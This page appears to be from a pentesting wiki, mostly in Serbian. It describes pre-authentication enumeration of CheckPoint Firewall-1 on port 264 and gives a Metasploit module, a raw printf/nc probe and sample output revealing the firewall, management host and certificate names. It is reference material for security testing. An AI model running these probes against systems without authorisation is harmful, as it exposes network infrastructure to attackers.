{{#include ../banners/hacktricks-training.md}}

Moguće je interagovati sa **CheckPoint** **Firewall-1** vatrozidima kako bi se otkrile vredne informacije kao što su ime vatrozida i ime upravljačke stanice. To se može uraditi slanjem upita na port **264/TCP**.

### Dobijanje imena vatrozida i upravljačke stanice

Koristeći zahtev pre autentifikacije, možete izvršiti modul koji cilja **CheckPoint Firewall-1**. Neophodne komande za ovu operaciju su navedene u nastavku:
```bash
use auxiliary/gather/checkpoint_hostname
set RHOST 10.10.10.10
```
Upon execution, the module attempts to contact the firewall's SecuRemote Topology service. If successful, it confirms the presence of a CheckPoint Firewall and retrieves the names of both the firewall and the SmartCenter management host. Here's an example of what the output might look like:
```text
[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...
[+] Appears to be a CheckPoint Firewall...
[+] Firewall Host: FIREFIGHTER-SEC
[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com
[*] Auxiliary module execution completed
```
### Alternativna metoda za otkrivanje imena hosta i ICA imena

Druga tehnika uključuje direktnu komandu koja šalje specifično upit firewall-u i analizira odgovor kako bi izvukla ime hosta i ICA ime firewalla. Komanda i njena struktura su sledeće:
```bash
printf '\x51\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x0bsecuremote\x00' | nc -q 1 10.10.10.10 264 | grep -a CN | cut -c 2-
```
Izlaz ove komande pruža detaljne informacije o imenu sertifikata vatrozida (CN) i organizaciji (O), kao što je prikazano u nastavku:
```text
CN=Panama,O=MGMTT.srv.rxfrmi
```
## Reference

- [https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360](https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360)
- [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html\#check-point-firewall-1-topology-port-264](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264)

{{#include ../banners/hacktricks-training.md}}
